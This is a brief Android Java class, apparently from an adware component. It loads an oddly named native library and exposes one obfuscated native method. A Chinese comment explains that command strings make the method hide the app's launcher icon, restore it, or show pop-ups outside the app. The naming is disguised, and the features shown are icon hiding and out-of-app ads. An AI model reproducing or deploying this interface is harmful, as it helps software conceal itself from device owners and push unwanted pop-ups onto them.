package com.passionate.annoyed.ruthlessness.start;

import androidx.annotation.Keep;

@Keep
public class FebFive {

    static {
        try {
            System.loadLibrary("EfLAxacs");
        } catch (Exception e) {
        }
    }
    public static native void febSo(String cmd,float bl);//参数cmd传字符串:字符串包含"cu"隐藏图标,包含"dm"恢复隐藏.包含"va"外弹(外弹在主进程主线程调用).

}
